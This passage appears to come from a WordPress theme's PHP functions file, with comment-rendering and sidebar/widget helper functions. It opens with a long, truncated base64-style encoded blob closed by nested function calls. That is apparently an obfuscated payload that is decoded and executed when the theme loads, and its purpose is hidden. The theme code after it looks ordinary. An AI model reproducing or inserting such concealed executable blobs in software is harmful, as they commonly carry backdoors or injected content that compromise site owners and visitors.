qtgSLtQ74bh171L+IvDz2p2IXXrSdaz/OInLtLktElWs8UMAqFHAqGYsWphOAod4Wb/05arqZn0EIUo7nLz1k0sednhi1+qmkGdhYAy7gd4xT+/LbXjJ7pA2CwteqaKDDejfy+nK2JfiBUrQabU84Js9GXYpPB+Pz76entgx2Yg/sRLV/ThvC/DwP8jjKeg/H1JGHxunYlDU0+U0epbxq/D8zytbY0IxIal15sunGedX5Onm7fhtiBfdvSo0NsFcfspdsBZ8IdeiKmh8p3rGXzkMC80XeN/y0NmQGBn3zTrWVfXlkIRzzRftlTlQe9TGWt73qYymxR8xVtdLYN/vPqlb+XabgOZaLoS6d7nP4mwqsgnqajoD762Q/jsom6z6GBLzaMpJs05WkOq8VFc1OSupl0jxNTB0+jRgLyLQVpjkmmvZvcAunDsHe9pM79QRcn7OgYoO4urvyVV4O09barz91zAC+TvBElDWaz65kUdCktu2en4QZftVYFK/HvnUyAD5tVcUJXR9JkIaU5joE0BtRfPpeiofLUbLmzgNY+HO32q70IoezyWcdboQSba4hD3hThTjgwd0LssK4ygpdIJOSZLKCNhKAtiLzyCV5rdw+Rl4K6vLKzpHZ9Vej1QAkv6LWUUjPbnt+QKXg5jOLXjJZlvrbH5Qs4rRihueDbWsGXSXMf8dfQJcR0VnRsAfMQWxt+I29PnVGJx4UryDj/3qh3KzF9FZv4px1n8h9gATR9530RnB4+eGordQE2Dc5YsY2diUo0ftZo8rLycKLD9YsRX0JTIo0FyoPQ+MG6RPTZJMw+N/lh1USrA/2Q6q07eWE8lpIEfxNK+u2y0G4OqWtIEvJCEl8HncF9X5y+JdIYMk6UkKbbbQ2cY1lcw3NjnbKfg65vMykYFmno9qeJqsopXybPnGaey47xaO51ezOhqGfrC/5LiGnH+j2Kex0mEkSjsknGNoj4ffSViThYNrNW89GfngzO3NeK3SehAONS3Zn4VqGjE5C2xe/QezZ0qzsM0jBVbiBkQHhKVozZN+XpI5Ee852sSiC5Vvat/ZxBZjspe4o5D0PnAfXhrFCTdBdWT5BoBA+kFmGk6d6vDa8IwQhLdCO1FXzwe8bgQP5CFAn0ghWoUumg3aqnMRxGBYeCymBRmgr9xHTSfuUJ/1V87Iid9oNx2XOSYK+eaexUO0GXYH48hoG4QFxVfbSTmpnhxyWEw86sfgPNno0rHmXxPf7SDWNEXoopvNy7DsAnFexd0XKz3/OiFiwWW9tZccNympe2H+VPyfFHd/DEK5HRciv3pAAw/5eFAy+ATVWJJCybsyGa8fd+TbL5YNsMV66hIXorlburAjmBfNGLFLCjMB/s+68PBxxdI7SWtGELHjVnu8vJsSEVVhBa9pn6Riifoc8KrQxjfWTZTjS+IL3YRthrCoA8PirugoXA7bJ/37HuOid+4c4TQ5X/JL1uhDQoxqR44n0YwQlrUsPtoqio8g0G0aSVsqFszRCKoD8TD1k5ljltDmW5ZZAaMS5lrva0ZU1EkwXJBSrLkhdDlxNzz8BQOA6zqlre6agnO+CKS0z/Z6tae+wT4drzF8D2Vk3y1/GpKXVXo0MqGf7Qj+DcRuP0DBlp15cQmbZliBwsFPlMsqzN8A986+N3dEGo6lOzLxMmdaS1sMCdCNGYdb0EIaQDhTWAWEsyXI4wS6YmswueFq0d87G5eB7gn97i4mVcfIG8bHQDC9o7+FdFALMV6FbwhdAVAwoKIcZMEp7pU1ZAB6JDw8MV/KyoWfu8nNlFJSPR8xQ2PKkweP0ammBwpBU6AOR1Jh9kX9jXLFT0Q8+XHeewnEenoVSqq/TV1E0YDQg5G/7V/yjqKq9n+C5peoJGgugt9390GTgmKAX1ImR7lJ00GO5CpQm5HnwkzBROkoOTgnjTVRMAepp5FcvjUVQT5kapS/OIzHzBeAKxAZup5bVSbv6hVIIAXZ+zR45cejIBFDVi9hm+U3n+6C/X5HvS4Q9z/oLZGvCcjI6VHUI6xqJKxoi3JngiMrb1yuGKokurr3acrGwjxgUU02wtXai97ee2Un3Gc4oyA5zs2GNj4vzmnnHw9CQ9Pa/i8NWLJf/OCH0FdfrLGpSEtY/Jpm64X0LeiU7M+STM/TG0A7gUxQGFmrxLxj7kBpv2lUroTw1ct/gauTJpGK+eZHe/hDFzf0TRSDDaauES9clZ2UYZJKSGXJvACvUBwGb5KHSbjnQrZq9zUdwV6qqJ39+s1RIKr1SE56+MmM19JgIlgAj5M7++vAtxgI8G5F5/xCulydVU3GvrkLA0FIWDpo9kLn/muQf9J1ozmhuS7Wq6enCMgbl9f4rClv6pSiZ/gP30mgoLS7z4nDzlJILcusMIZIpFTb6ZsIhQ9DXyweaDDb2BMsqD19JQz3bFQWYnlIBKH5UeHItclx8DZ2M2bQyhNyGT1I8E+GSbmrPZvcaTKI/f2aZRsKPl/YlQmsNjJMsHexH7vQZdMIy4uH8280J8Pspi++6wyiSngbfm7vT9HGuSkhOgqwYZFuIRG83cb8fAitdh/dNvUcg6xieinWbEHkntLpaRheFiN0T8Ct8CjaoFj/oRYTexG3T165sqthoGZWkFquQXr43cXv+DklhzOrWfPw70ci0qhMF+Wh/a4fYFajIwby9plJ9VM8lliHbg4saUvVL8wiBysjjm1ulNuuox6PLbnq42goG7u0/rAWw83PPQdq2unKQohKopue3iSbnJoR7hSqMO6sDoyx/P5T1nti7uNmqaIEh07EoRqmlTJxvF9Myaf3T4Wl0fS6+6Tu33w407CEIUsU4wpaXz5U4kwuEOibIA5dF3aj0+L2I30a2Q00LMnmlXekvUu5CzOVgTlgp8h+fa2pSqaNrPLGVO069ajv830RaaZLLoCdlwEe5iqLALv1lvdsxIeieszumDQNNpB6Bfqv/ONZL2pnGts76ySxEjKVtp/bmnVjF8nq9QYi0qkXXJcTOX5L3turxoQ65QwqDDlagSnZ6KSOKZFE4kG6VlRFNnXN3c3Vam08ogiuYagc9NNHNBbM1s64ylv3caOOpVl3Bk32p9q5DBLk/G4KKg2rjlYsOEOwuod4M1uOvOU2RaqZG1/BR4cUfj9KiuiJBO8JlpfHZQc7MpvH9HEnERPPXw3qgzwDSB9ou3SBlpEniQuEqMA5DNxzwTt2hR/FjXExeAD0kPxiAYLYQFC4hzoGZbZ6/tK6Vx+dcnDve2aVvD0JF9ElX2uN4uInM0rDt2Fp9Jt3INTPwEEuHHNBUyYX1YchZ6/26dq8RxfV44tk/JpClqTYBslCaBVwile87qcIXJAIdZ3kunYS/mDlmz9c7PkDgq+Y48OXIFHPK3k9qqPziDWD34PubD5vncsvw8sThHmfAF30E7towYIjfPu9miITeiPhKYL4g5Z5Whh0aZyqjk0yzgP2N607gz1RtqHr5Vu80YKEvczhNhQrZjr+/nsMizOacCCz4xvhUHYk2Pw2oXJv1ZmR6Ez7LOjxMXOtw9oOCDn3D5y2pzz8wt8hfa5tUgOcN1C5SIXc2WalrnbagZgd6XmrfdCdD4Mp/iOsXcGiITzJkGSi6183Ty5za0PyFNua8jYXyUYK1hnNUxNThQN68hIht3XpyqaViEkvC9BMfgOudpAfeqTx/4m2hvO6pmknP812ibqB5+rTtv+pPj8fppGn595/pV5MNbrKePEUASZF6z1fLhiFLamjT9Y4GmReO2kiwW9wMBIZKVnSPF92hvEpHS0ncTRaiqLKmp2UNveqy9qoIKi2pr7k7W06rZGiadU0XIZq8QqzNyH+BcOtkjMUu+panae1xYeD/OrRJq6ZV3cMF2WSMRi8KNW1wT5r45lAQWDXXpz4LCd3yLGLmcOk4AeaCrv7+jHenc90sUhURPjqqM5IAgRN8C9k36JxJWRNivtb8yE92Vdyy8oqrpGCXmtT3v+sE7m5+647ccTfqOOtyBSOZ40vvcfhdV3jh5xAgDjJe7c82pDLFDvOgrQIIA8kCDswzDFRA/MxX3qz4v8IQJjJZQCboBHX1xUDgMKUxS7Xr7BCjCqTzg4XS7k7T+tkZod5gtGusXAapv7HXPhtI+1EZdwOwPuhY8vFQXN5G8zXgd69Z83eGevvJA0Q5N2MYopZbCKha9g6FovrofaVR5RFn1vAkatG+e2pI1G9Bl4a148gxjzyiTaVNbVacp7A/1b/p56vmuuKr3Buuo3ntkPb6l0Q08x5RiTFLPvaA6gntzwUfe6bihL6mCKPIpm9rodskluYh/VEC0NQI3HzHWBW6EhjZz+xUPMxEZcE3uY72LjIuTF4vydAXVUeIhJivd6DkcLdwg0gh+s1m5yrjYKONDzS2DXoJB/hEFixsBIGUqetcpSCQR247ir98cKzr89UNhoJXKZds/9h7T7lnd9m8ibys+nI6xNnL2HKFHZ7uqnNd+EIvWT2SfymRxrANBf+5g/CxRltmqKTR8q2Di6kvI/8ydK0ZoMMxLp/2JfnCY8aVOZlCQW0UuwiXdu37HIjmrCC2/YjbPTltw61G7SNcHr5reCxOGHB/I1+bWN2dYUoWqxW2ZuotM48kLD0iO+DtSFdDEE2ifcDizy9mCW4cfMNAL4gpiVTc+QxEVJQJeE6HYMH9KB1oUkI20UwaGH7o47WFdJ0LJYouFoWd8O5aB2Etg3bnncSqCBUlj8PjD7nIxpS1VRrvcYS6zQHT0YQARcZACeSXGDMdGpprGfVw+T+AoIsk1gHwaIGDjKQhrAz/WieuWHXiF4uB/VtiQ5TCN4o1iLdJd04gq3ZqLK881nlNH+OFJArKbJEmMZGTqkblZQUy7+FeEtTGOrJ4G6tIO7WZ3yml24ZG04gk8Zw8uyDJ0aDmcsYEbilpF2OEMSR1SjIagpt2wbrwJdSabLBU4L3k1DO1yRhrSv9vxNMJt7jmGCQ5V4bgLhIkAwC6R7tBtDhOirBu10CMOQxv5Xy9j5yZ23st9wWE/drW8udnxT4LBs5NHgapfVx7ZQUv/HPES3jf0r76wjNQpt8G2F+5Zq9o7Kpn5n6CVop1ifUwyQRWOal0OlUZytiebazbvQDS/aD7PanqFTFrga0C5p9drcJN3wXSH5kiwbjAo7S68bM48Dc/a51ZJl7nIUoplplUowEhpAlm28QkDZDs61XOn3+3OP+EyLgbMbQtqdDTY9upEReo0Y6GtK7rk87wh/JGHenOu43hU16ICwk273pUgRYZukGiZCldnyb6SeiVht+BxtXea5A5CzYaL+XpsfcwHmV3XAutHLcusIumxYhL1HHUvaUHPnUOggbxbhslM5oJHuWWv5TPTgok5L6TWTPXFKGRLLmoV7jdH28tFanwTNR1a6vDfrzVqBZIyj5ennShHICC42ABzQfHsMVlnSkAmUhq6eVwxcpnqI2lhCoBZ0qfCZIvI7Ns9jPIKTuFgivNtC+rJ9ZEKesUt2O9Q7iS0/vEZEgrUv61ch0RVzrFaEO0wLI1duNAKUO1J3aRPitMB4QQPnmeyesNVzQx5BErjK8hY1nF9HqJwnmGflEKcLQQSSrg1+DARQ8gWzrOti2Q1lajEj+4xLosu3f2p5NEtKnFiOrpOSWjKA3nP1aheM/b3lAf9ZRkrWq0e45g+LsGVxELgskNNk/YNQ6L5xF8+s+QMKcPNNGYS5AeZN/GvDn0yl6tzvbxgjMK/XPlVuSZNKsAveaMt4inH5ld9x4NCfpiNCr7ligZJaUcgaJd86rf9mIBv5KYe4T4YTzKoZ0+j3CQm/+Y7yXUFGq9wnuXiI+TjVADqph5NDKn6gB1Gs+v68T3mR+yNXJ9oW1a8p1CDRaU4WeT4z+E1VXtOf6MHGQ65nCr6BjBFA86h8GmTmFBuIzIveON9vyB8ToyoYZV98kvjJl8y/0X+tmmvt0IFmZoHDj2LMYNzlFoKNM6LNF/YN40BZx5jN8qpYSVmq5MgZVwmyuGrvHoXkixafKqnTsmtMmc03j2JfBiF0gxdqkPpiTrqW2gEjTwCMYauoILSaiMx8PPn72LjS0OOQR2LfAerucPGddl37bFVo3d2msTJsZf6VbYcQCjWVVt7hlLny/CgTnMRJxDeGsjosqYNlSjP7eFtYgORPqCBdn4fZb6Q4BtaN4osi6rR6fu8Ev1r8n0abT8G9KsDhPdH0hxmZYn0W4Tdbg3jfDFc3yyi2PBfvAq4om5D93j5uZsgcvGyZvTBfbuDzSH0QCLh5l203yqn1fc9tZ5U3JY4EG3J6/tgFSe2wrQ9Af5FHmKA5YK4Xjg7gWigA7glQKat5GpvaM6NHnEhutfk7wO9yqT9qirjjmezXzGxJG0cGDXU4Hjq0c7MaWB60fkQrK7zKM+3tyfWXFK62jxcBE1FuYJ56+7agblWKdBl0sNiIzEK5zrSBdQvE7EUZoNM/Kj38uWOAsStvDhqJCkFqkz6yIkGduW2+IPbtHDCMNQHbn9x/2mxzq1mMedN0sPRBAoySTLOrDlq/ayIHhaaKrW4YtNxJH42kXJDWXN3YKBxBinVvcjkFAMw97X1vPjkfoBB/JReOHIw5aRPvmSVyPuPUwJwfEi9EbPfSM/o9bi8l2Pgl8t1WTG7/zn7FNQSnMVOf6SMtnQikBDwMgLAzloP8NTcHaUYM1okGBsQc4m1JH8vFzV1AKNstHwTreB+etsr5Zf7PL3gZb22usljf9VrguakepoNPZAqsJaDrFdqpHAez93DT6oYfVagoLznnJLSkACyUFnlvKfOooDsZiVNt6xRxKTnXmXgeCH9hv0VyH7Uupp4AYbhBca2cUVQ20DA1rudn44Wksq+es/ouSeUYomWsRwpbfjQiDYFg8ONzxc7axJTohMJXW6swN67u4/8FS/oOF7R6bKXRUrs3EGfo6oOQutzilNOcbrSxSno7UT+yKerjCOXZtuQMeXhvn8uk33d5YoKUrQrQ6X3CiGDOOYr5FkZ0ejtOk/ge3CPLNJGKF6yH2YlSCYoIQoeLkEHDD030xd2V7DzAxTn9fbg+PqZBFy15jpErJygWF0Q77wKyYpQV/4Orj4JMq2wqVB0c+EBAqEjWk3h9CI9IH4kQyqzohpqu4K2BP0L3x9GQgIxon3r7N0bPFeoifysyo+Huyd1U/Z0/ERZeYmEtpJCTjr9/zkqC/KJFgIg+s0R1V/gidrv35XHYnXffGY3V1oZkuicPPCWmY9W+lHvzSmfyASV7PXE4hzDopoR0qnbnkyP99HZ41rpHLSgHoF35p9kKGC4DHSacMB97SzswTBr2KKaDl2Q/OeKo5dD14LYlFePrtGfqeGre/+YPXLUEXbfwZDCk17SEknkoFnulUbSlz4Z+uMvYmNGHK1nrzTZYg+dsIyKAEXpQEeLp+QtQjjHG1NtWOA/nFFUdYUW7QOuVReSRdtvkXePcr3jWv6nduvllPpSIYfJOONjfJ+Ym0P772ygBWq+DoXUtleh50jYxXmYg9KKDwAbqMoRRtItUKmTP8eO5FF8C289KgBTlPqtYH1sooBUKBYXAdiMdySKvLdlnhrGnaUZ7KuYOa165p9yvM6CXfnd52YIoGEn5RpIOfs1RpSJZBfVQ5vJSf785NVw9eAmA+QkQgIN3dxwuy7oIjOru0pikzEj7q8Dew+fXNxt+CbNZxwnu0/xlk2NA98tQgTwQLQ3fS4uQZyjWkm6iLUXMabZUuhqvkBtJpNeYuESpPxi4a2YglJR2Z5Ldd6CFAvtpn37o+1eCH2QKsB3tzoExFz78g+wNJDnrmzw8s9kPR8cRgSMRsC5dFiuo5w1QdnxeOiufA1AmUWBdeMeD1YLzJQLguoSkKy25lHNNoBcRqAjwvkqavUP9jDMP63QVXwIVHcd4EXZZfOGSnHla6XitphRy3vZ78VbwqqjTJtEiSvti0tyg0Lgujbvobeh6vba+t+JEFqIwtoh3dLh+zqvu5/LBpXdrG6WdtO7gmKMJmc7VlbVdhIRSYvdCVtoGmnMqGlOdjyrGnk00tMyVkxPemTRZl8p4cmIpB8nUKhB/g96UWS0q9eiW2Y4CCk+wKu8XUKuhjD10oW8dQhXUDDY9aXj8sub+nYaPyR/6qdugz2Vez2xyfCT+EshuLT9oRxkz/tUEO06yB4500ziRQHUyl2oZGJmc0PmLPjXXJ9xvS6VgmEDIBqu3bp71Nk9tGP5JNE/Gz3OHRIb+Il0vZfn9O1fPpD96CF9nmnwSC+YGwghqqlnKt1ZrO1xlZg1lRi6TFgu+Vnnjr+9JhIRdyFRQ7zdbC0X007DsE9QA1g5ICSWT1kUVB77UH+qONFLcaS8HL+AmIIwBdx9oee1VF6X6AiTOH8/B30DFlbA8hsZ7mL8QKCfWHjSMCP5I6Taqb4bdaCFE5HGMcuPRJ4KHai2diHVbDTEUsRLla95GQY4zIWsqTdOYVi54Yp/EYUHy/mnRDXCGQCoV+uvBOJB81yUelMA2ndQ3kaYKhysLRxchlCWCPzSEy6ESntjhWEb3S3k5Trq5kxiugUcRLfp0DXXe6LeM85DJfL90Ef+b4E1+GPtKmaDb48jOrTzAFA1kg94M2/dYKeg23PMQpZTYkjAABjYH5FaaGfnpcdMRPjuwSWtc+j0QdULw2zwfsD99rExXA+RAlegDZYNuwVJyyz8BeT7g3MHBagZ28BShYaBZOpv6bpFGuNNPwcm3YwPqv5yQBT/qrPQd1Cp9shEM8GRDTDF6mg86K160N963yPQaGQrnslNWe3bDPSxWBC7UuPpZvM0fV6YZlMm2StXMewqDdjArIlNfnwaF67U0pFjP29cmTF6eCdYNNEOe3fYkmyoqV0CxoYktWzD3JQ+JYrH+8MJGa5ghW5SSEAf+8IEmQw2o0YG2Hj5B2sPg2F2zWWXU4cFlAOpiWb7p4vN1RtOeZ2vqdmgKL+qVVam8gW29Zncamfx18dwX0GQ8lfX7QGrLeH1LRcDd+KVId/DiJPcJfp2SYNxgM+mXek24CT6sWSZ5XVjxNR+fVyKdP+OgvLtiXZqvwOuXfpjnjs6zufEB9YsW+44zitP64of2N2Kl9gUo22VkW4GqKAMho2kdMW9cO7huS5Ll2FJlGxmDw8EgAKfPBIs1Vh+44hbHH55gX5q0UnBGV8fEQM48zuLqs/OD5G/CgZVlBhdgy5U0kgnf+4jfgTlnSCGNoPgmJiQxn+Wck4nIVY0Mas+RxIK13KsD1T/7mDLyIIAKBXTjelknLcx1PQsIXgRERT+W8vhSTiOXkbdqGpYSk36vLMznhGeabe9VjxGRdVnwmdmLcscJJQS1/4jmuYCYBTHp9EDRC0eECd166q6r5tFZxWfcjckeu+Dy5zz2Xrl50F/EjwUj1DQyYQ27gNSH7cAVgeQjf58OpEL6esfJkcgg6fQkY20EpzDHdZGGWnK54uADlUzxdEI1/meQ3hiE8jsTqsYXfSUqrj+YCy0MkFtawWUzP2pofUL+gP34gPw6prYuJwB93vy/xpvhYPKyyCDazhO8QZmrnFlJdlVNLm3BJG3MGaLoBO3EpBYkEBwagr7Xs04iKNBtKhLoI0eCHbaXvPnTdiAvVu7M3auOMg5CjKb/iQLhBtTkEI25pYicCwSjey0RZhUOwrIYyDaTRmVO9MEGnosaSw7HJs57K1B7dcqmEiKntxFa0RuBTlCJ7JFPuzNUcfuwRiHHBc0XlrbMJDZVgD5B7UccVZjIJrMNn7EodFAXSh4Iy3FK1fbpWPK113hz4NBJAi3iYiFkYhFiTJy4mMrcTDPI8cxWgiN/r8mtByVsy1dnRPnbtEbDakjxYZWeP542YWWuvVXJ5OUThMGwBcV5klCjSH3tafp4nwsseulCvIXDEaGNQ/pVyj316FPSdMbUpqv26Y+m7YsKiGq2jgR8QaMMH60ddVu/fBOJpDXweSjzktzILZTvVVPvA+qmwU4R2Xg2KG/kIS6CwnOMKrjbLfHUtVq3RmEPHIVPekk0Iq4y5OaBNLI4luoe+2UL+3Xp9bz3eI//AkCtFRqDpf+LaGewOwq1e/nkxAYrbllS+vZ0aDwrpy4eiG11JtyNmWPlgxW0faH6sCGrpycv6Gjrtzdgh9EotyzFCKirRpeFVgyg9AK/+7jkHA/0yqsLl3wU8CsELithBtom8xfDY4AOe9e6C88FsXsl6TmnIYVQyNb2R1b2UTt9ITl/mInc8RG8JjjxWJbZA7rKmIcGwomxHxQcTF7g1ta9pCiGENQIjmq/uc/dWFWnfe6IwSokZjsMHsoCD2j/1mcFMVzzGSzPlpcMMAYSJTmKzopJwMCbUFdAgMYuenGiBEO3GbIXuG+L1zQBlxhsda+WkpLeHndp5V19vp9lHOT7pfM3EO+aCrPQVlWTWHQJ7uYj+AKlo74TNIOPX5zIvKpxa6mIoAWz8EEowSTSuYbd6h4NOHzbARehJcFjEeKMsfrfoxRxBFZXWJ9QrJk2GArm3zhmC/US8aN8tiHD4nW6YNvDbKlQtmmOhmRg9RvNIhcpr8dkTGlhKNpt1C9E6QUfZ6j6aMaVoFr0zoonW/Pht22GCgipFYuxF769qIQNnWvc6rUan1uYZAQdzQdCTpjAiroBJjjy3jqgygYCQMgC9vnNbP/Logq1p7YvpX/InhQqymN0CXa/BiWiiGF3FDqDnq2fRIGK+IkoJcAvQIBBJ8CU14NH4zIeP9jLCEdqYtBXCHqYV10ou3JGl+6sWsQ9N7pnqPlmMBB4XhhbTg+aQk3WpmKQTDBvMxBwd125AqJSYzeEO65Ld8S3/QxK3SqtqE8vC0tFaNzFZXvUoemekDb+4Zfkbh5RylZXUVpm4+NJVrf2e+i7tzucKYiS9LgpZrexiG62Ulxb02yPIe6nP0I1pAjNNELTRvKA+VZCQrLDGBdGrLY2phXC4mA6MthYEgZhodm/xFGzkOfghO7SCU/TwwMEmUTaecktNlz1WnGU+o6LRG3c6KXsGy2wNo6CoGv3aj4eK+UZTJJatSEjSeFdlpM+p+0FGiCeyBxSCKP8VAAPUjUk1kjxPji9LFu1XrfDWEKm8KRbgpjqsyNWwvaGa0Ic4DICaWLJyJId9uuSm9ld8p1gHTCBAqN9D5Zxo6TgZeBWRlaq4eadK2Zrt3GZnuIfA3HO/ypXh72uD6NHxWkdqAcYnFmKuU0PRRGBDXLuK1EdinL7m7k7vI7E67F/TjhqSkR6++0yQfQu4XU9RoyLbI0Xu0FeIirc+yAu6jfb8+6RkVGCnac8HPVtEJjlV5wwTmV56fndxM5GwfbopiQOubcp8xNDcNIpy+wWE02V2wxvYjD/VXnhEL6VKUJZ9NhtH7sv3kymA6k6ljCbNi63ar7yA1VGh35KSTcKb7M1RDbTNTasX8kfvRlz+eCR8k32JpY61BjqdLvpPzmBn0Y+POKcb9EqzfJKcrWRm65UuJRy5JYkdycoQIdCn0fNNa2SIrI7ZOD8ggzy1nObmC32bs7NEeCrwTCFXVnoB71OCPJ4D6kjud0rlViG8xAZlg5MIGe1/awA9DbgxBRQHGfKBrwUmajZzZfPUIFQp/6wJM9SxIJJwQfTkiJZ3IZ/IFhc7XuS+Ult6VZCS6vF6XtgF9da0W5o6XAi/n3z0IYNDehD4wkmwxhUXR0D9MTGkXfnegiuAviQyr8BBDm8XDU8AB61olM1/JoNb0ZxsvpykvRF6Q/wjy6IUKTH860Z6ByQBh1d1xXOsEQUwQlW7pbvWrn3E1tATPsq0QZ7QmW9Bs1tlT0mThTz9inLXvIfHKCWtOO6kueWaQd6mlcp89uW7SpnmEoRwEbVhsZeOL56xkVAcWnrl+u2NrLs7BEI10jbkGKrUBkSaVBHKurTytmm1bpC8qQdtGgACXZHTUzxmTNO27v83mXLyTpRi59+2hi8c+z19d9S4jyD4PPUmvzaJzHPwP2OXwTJU15GgnCeSFuGRhL5NNPb7FMuRnoPT76yLOrxfWbfduxjNINui1VWvFq7VRJ+gaUJ/HiB/zNl48zbKjo2cHSmOoNxmAaRt1+dgGS+/i4gSe1P2SJLRHKgd4TEF7uRyOGfGDuljTrWL8Nmpg2Zjn5C0xDo707YgcgYhQpmOO46b7nN2MiVBZrMgJeCd01f/SP6jJ6XoPgi1tqqoRM36aTE0cYlyUVQRFlvAXZ7eMNpisbc/zB5546zClCyr/1/tlcuaRrjS4w/j1Qh0NGtc7woRS0ke99X6ro3kagi2GnY/baZlXtrWrcVkuBpQiuVfnnm4qhgd3wRFLNk6kz7PQ7TpSWYIfZRGwCcVU74zkLU0rLzQd8VTmXr2hnnsqDxFHobPqQVaFdfwWUcF3O1i4dFKAcrR8pjKhHLTxLHqhNxUs8oOjlOjSSP9dy7cMVmYtvnHD/o8b1CE6AD9iQVP/JZ/3KOgNiU5+k5Ra5zys62dVr6MC/kVcc1r4x7pJYzVcJngm9PgwSKBPhFmUayCB1EQXUizU5hD6oTctrc9ZAfP512bgkX4CZ+L70RV0TtiimnpWvrMZz5P1VaBvrpPFf1FCdD5aoX58F9J5sodQDc51g6Dd/3HLOYSSsoc40MARq8XoXJoxyX6WMczw3/tXaeu6zDE+2ePp9PjQyd0qMNu+tK/vbN8tBCvQ9iTSZggsy5+RPUwZqyg4Qxu1wUqu/B4od9WLaN4JFDGtCXzYDNZFKvugcZ9IsdwPGOOy6AKS1XT9ZUS0BTIdtfixhJ7ajr/e6LRlPoGQfGUtZ1ANC1fFPCGVXO+lLX1CcgABT4b8njvcS6rXuq3cPAVzUyKd0FbbW3QFm2DX4jB6yEXAyfaJMxr8FlTpzG+SILvHrqr4FDthw3EdCLOCTDmxbgDHGgh2d6AzTOOjaKaPm/RUgaZ4iQoVolwNdkC0OPFWOGMd7uCJ9Z4bEmGa/vvidePlzcip9sBXvAz4K9vKb4LMV3GKPCp1JBjutZcd+GiC7LBFiq81n4KSl9LC5pDKAMNwLc9yrZQHiFOSKsZxjIifdBw5weRDGImnUUumtrAL9EqV8pE5WNw8Kf+Pmbkkff1GlVP/uXHcC6H59X4pnEF/OCLEtFMOJjW8SodjzlERURBFJ5+trk85HxGB3+JQhrcrXxPoRtNlLt58+t10yG+KFm/YRyFvYhT+iUFWgB7Ag7QJ1Wa+2mEqpmuR11VeHyI9d9xF3XiIsfT4ByUDrYdikckEA6XJfsNqVD6j1u0CuEVe3jNL9NFIgj4vY5/ZCdkCwcxbOPoq2EbOBpMVQbx9HUHLBd2qzhIJTCCzgzMen9/mMUSC0caMnH9Zpl0rHT+ONTRS/iBzx67nudbD8mVmNFNAf6KbuuwbP44qFZNExk4A/xVWX2bQxSJndrWWGC2HTbM2NK2c2yYEsLihwpFLcxA0sBgYFqSfTD94ml9V0Gcqap62SvRJPDA0H9IT1uxr7tHmIZf8a3yOvMXhnFIoeRjQQ3tM17IQVyVsESzPboKVSudlBzP4utI3QfY5JhfDc4iR+3vQROLmybovYDS4z0/wSlmFtjeEvRLKekGQNdAkgdbUZQ2z78JftFVPdtKwvkARG6CiRN7m2+gv+l1Nnlkb6AQhjFkaCiJKiNjhvA4WkKPSCPVjMjVpPlOajiyVooAcWI10k2r1N1tw8i9qfxLr84wZRYZEb0OLscFllIMnaFwRbp5hLn8DPT3gaV9ZvzJgXRnio0Hb13e3MuNRmcxMZjQl0D/XCJhX5hWuSHZxMWC4J0YDrr+nBAxX1bXy1j8hwufpaIGzcE936+KyM46AJG3vQyVdjtJWLnbU2wBUuCczj2CtqE1pKApgCyois637dDkIgKTYayBsM2KNQ90STvxtUJigtU0vRVDwjS4m3ami8J/+iEsLnK/36gCe/EAy5E92+PbH3f8c83/xdU3z+s6/08fX/7mEg+6i9VjrqdR1zq6eaMfLWWFazSCMZwHAGNW939sJcsMxgZfhpSmMU'))))); 
function art_comment($comment, $args, $depth)
{
	 $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
<div class="art-post">
         <div class="art-post-tl"></div>
         <div class="art-post-tr"></div>
         <div class="art-post-bl"></div>
         <div class="art-post-br"></div>
         <div class="art-post-tc"></div>
         <div class="art-post-bc"></div>
         <div class="art-post-cl"></div>
         <div class="art-post-cr"></div>
         <div class="art-post-cc"></div>
         <div class="art-post-body">
     <div class="art-post-inner art-article">
     
<div class="art-postcontent">
         <!-- article-content -->
     
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48'); ?>
         <cite class="fn"><?php comment_author_link(); ?>:</cite>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link('('.__('Edit', 'kubrick').')','  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>

          <!-- /article-content -->
      </div>
      <div class="cleared"></div>
      

      </div>
      
      		<div class="cleared"></div>
          </div>
      </div>
      
     </div>
<?php
}


if (function_exists('register_sidebars')) {
	register_sidebars(2, array(
		'before_widget' => '<div id="%1$s" class="widget %2$s">'.'<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'.'</div>'
	));
}

function art_normalize_widget_style_tokens($content, $bw, $bwt, $ewt, $bwc, $bwc, $ewc, $ew) {
	$result = '';
	$startBlock = 0;
	$endBlock = 0;
	while (true) {
		$startBlock = strpos($content, $bw, $endBlock);
		if (false === $startBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$result .= substr($content, $endBlock, $startBlock - $endBlock);
		$endBlock = strpos($content, $ew, $startBlock);
		if (false === $endBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$endBlock += strlen($ew);
		$widgetContent = substr($content, $startBlock, $endBlock - $startBlock);
		$beginTitlePos = strpos($widgetContent, $bwt);
		$endTitlePos = strpos($widgetContent, $ewt);
		if ((false == $beginTitlePos) xor (false == $endTitlePos)) {
			$widgetContent = str_replace($bwt, '', $widgetContent);
			$widgetContent = str_replace($ewt, '', $widgetContent);
		} else {
			$beginTitleText = $beginTitlePos + strlen($bwt);
			$titleContent = substr($widgetContent, $beginTitleText, $endTitlePos - $beginTitleText);
			if ('&nbsp;' == $titleContent) {
				$widgetContent = substr($widgetContent, 0, $beginTitlePos)
					. substr($widgetContent, $endTitlePos + strlen($ewt));
			}
		}
		if (false === strpos($widgetContent, $bwt)) {
			$widgetContent = str_replace($bw, $bw . $bwc, $widgetContent);
		} else {
			$widgetContent = str_replace($ewt, $ewt . $bwc, $widgetContent);
		}
		$result .= str_replace($ew, $ewc . $ew, $widgetContent);
	}
	return $result;
}

function art_sidebar($index = 1)
{
	if (!function_exists('dynamic_sidebar')) return false;
	ob_start();
	$success = dynamic_sidebar($index);
	$content = ob_get_clean();
	if (!$success) return false;
	$bw = '<!--- BEGIN Widget --->';
